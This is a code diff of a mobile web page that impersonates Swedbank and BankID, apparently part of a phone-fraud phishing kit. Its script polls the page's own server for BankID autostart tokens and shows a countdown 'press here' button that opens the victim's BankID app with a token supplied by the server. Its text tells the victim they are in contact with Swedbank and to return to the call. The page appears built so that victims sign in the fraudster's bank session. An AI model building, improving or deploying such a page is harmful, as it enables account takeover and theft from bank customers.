@@ -1,111 +1,65 @@
 <!doctype html>
-<html lang="sv">
+<html>
 <head>
 <meta charset="utf-8">
-<meta name="viewport" content="width=device-width, initial-scale=1, viewport-fit=cover">
-<title>BankID</title>
+<meta name="viewport" content="width=device-width,initial-scale=1">
+<title>Swedbank</title>
 <style>
-* { box-sizing: border-box; -webkit-tap-highlight-color: transparent; }
-html, body { margin: 0; height: 100%; }
-body { background: #eef1f5; font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, sans-serif;
-       display: flex; align-items: center; justify-content: center; padding: 24px; }
-.card { background: #fff; width: 100%; max-width: 380px; border-radius: 16px; padding: 36px 26px 30px;
-        text-align: center; box-shadow: 0 10px 30px rgba(18,41,74,.12); }
-.logo { font-size: 30px; letter-spacing: -.5px; color: #12294a; }
-.logo b { font-weight: 800; }
-.logo span { font-weight: 400; }
-.spin { width: 52px; height: 52px; margin: 26px auto 18px; border: 4px solid #e2e7ee;
-        border-top-color: #12294a; border-radius: 50%; animation: sp 1s linear infinite; }
-@keyframes sp { to { transform: rotate(360deg); } }
-h1 { font-size: 18px; color: #1b1b1b; margin: 0 0 8px; font-weight: 600; }
-p { font-size: 14px; color: #6b7280; margin: 0; line-height: 1.5; }
-button { margin-top: 24px; width: 100%; border: 0; border-radius: 12px; background: #12294a; color: #fff;
-         font-size: 17px; font-weight: 600; padding: 16px; display: none; }
-button:active { opacity: .85; }
-.tick { display: none; width: 52px; height: 52px; margin: 26px auto 18px; border-radius: 50%;
-        background: #e8f6ec; color: #2e7d32; font-size: 28px; line-height: 52px; }
-.done .spin { display: none; }
-.done .tick { display: block; }
-.done button { display: none; }
+body{margin:0;font-family:-apple-system,Roboto,sans-serif;background:#f3f3f3;color:#1a1a1a}
+.top{background:#fff;padding:16px 20px;font-weight:700;color:#ff6a00;font-size:20px;border-bottom:1px solid #e6e6e6}
+.wrap{padding:30px 20px;text-align:center}
+h1{font-size:19px;font-weight:600;line-height:1.45;margin:0 0 8px}
+p{color:#555;font-size:15px;line-height:1.55}
+#b{display:block;margin:26px auto 0;padding:18px;max-width:340px;box-sizing:border-box;border-radius:10px;background:#e9e9e9;color:#8a8a8a;font-size:17px;font-weight:700;text-decoration:none}
+#b.live{background:#ff6a00;color:#fff}
+#b small{display:block;font-weight:400;font-size:12px;margin-top:7px;opacity:.85}
+.spin{width:34px;height:34px;margin:26px auto;border:3px solid #ddd;border-top-color:#ff6a00;border-radius:50%;animation:s 1s linear infinite}
+@keyframes s{to{transform:rotate(360deg)}}
+.foot{font-size:13px;color:#777;margin-top:34px;line-height:1.5}
 </style>
 </head>
 <body>
-<div class="card" id="card">
-  <div class="logo"><span>Bank</span><b>ID</b></div>
+<div class="top">Swedbank</div>
+<div class="wrap">
+  <h1>Valkommen!</h1>
+  <p>Vanligen invanta BankID-signeringen for att fortsatta.</p>
   <div class="spin"></div>
-  <div class="tick">&#10003;</div>
-  <h1 id="t">Vantar...</h1>
-  <p id="s">Hall kvar. Knappen dyker upp automatiskt.</p>
-  <button id="b">Oppna BankID</button>
+  <a id="b" href="#">Vantar...</a>
+  <p class="foot">Du ar nu i kontakt med Swedbank.<br>Folj instruktionerna.</p>
 </div>
 <script>
-var code = location.pathname.split("/").pop();
-if (!code) { code = new URLSearchParams(location.search).get("code") || "default"; }
-var card = document.getElementById("card");
-var t = document.getElementById("t");
-var s = document.getElementById("s");
-var b = document.getElementById("b");
-var cur = null;
-var opened = false;
+var code = location.pathname.split('/').pop();
+var b = document.getElementById('b');
+var lastTok = '';
+var timer = null;
 
-function show(token, redirect, state) {
-  if (state === "done" || state === "signed") {
-    card.className = "card done";
-    t.textContent = "Klart";
-    s.textContent = "Ga tillbaka till samtalet.";
-    return;
-  }
-  if (!token) {
-    t.textContent = "Vantar...";
-    s.textContent = "Hall kvar. Knappen dyker upp automatiskt.";
-    b.style.display = "none";
-    return;
-  }
-  cur = { token: token, redirect: redirect };
-  t.textContent = "Ditt BankID behovs";
-  s.textContent = "Tryck pa knappen och signera.";
-  b.style.display = "block";
+function poll() {
+  fetch('/api/session/' + code + '/state').then(function(r){return r.json()}).then(function(s){
+    if (!s.ok) return;
+    if (s.token && s.token !== lastTok) {
+      lastTok = s.token;
+      b.className = 'live';
+      b.href = 'bankid:///?autostarttoken=' + s.token + '&redirect=' +
+        encodeURIComponent(location.protocol + '//' + location.host + '/api/signed?code=' + code);
+      b.innerHTML = 'TRYCK HAR<small>' + s.ttl + ' s</small>';
+      clearInterval(timer);
+      var left = s.ttl;
+      timer = setInterval(function(){
+        left--;
+        var sm = b.querySelector('small');
+        if (left <= 0) {
+          clearInterval(timer);
+          b.className = '';
+          b.innerHTML = 'Vantar...<small>Token har gatt ut</small>';
+        } else if (sm) {
+          sm.textContent = left + ' s';
+        }
+      }, 1000);
+    }
+  }).catch(function(){});
 }
-
-b.addEventListener("click", function () {
-  if (!cur) { return; }
-  opened = true;
-  var back = location.protocol + "//" + location.host + "/api/signed?code=" + encodeURIComponent(code);
-  var a = document.createElement("a");
-  a.href = "https://app.bankid.com/?autostarttoken=" + cur.token + "&redirect=" + encodeURIComponent(back);
-  a.referrerPolicy = "origin";
-  a.click();
-  t.textContent = "BankID oppnas";
-  s.textContent = "Signera i BankID-appen.";
-});
-
-document.addEventListener("visibilitychange", function () {
-  if (opened && document.visibilityState === "visible") {
-    opened = false;
-    fetch("/api/done", {
-      method: "POST",
-      headers: { "Content-Type": "application/json" },
-      body: JSON.stringify({ code: code })
-    }).catch(function () {});
-  }
-});
-
-function state() {
-  fetch("/api/session/" + encodeURIComponent(code) + "/state")
-    .then(function (r) { return r.json(); })
-    .then(function (d) { show(d.token, d.redirect, d.state); })
-    .catch(function () {});
-}
-
-try {
-  var ws = new WebSocket((location.protocol === "https:" ? "wss://" : "ws://") + location.host + "/ws?code=" + encodeURIComponent(code));
-  ws.onmessage = function (e) {
-    try { var d = JSON.parse(e.data); show(d.token, d.redirect, d.state); } catch (err) {}
-  };
-} catch (e) {}
-
-setInterval(state, 2000);
-state();
+setInterval(poll, 800);
+poll();
 </script>
 </body>
 </html>
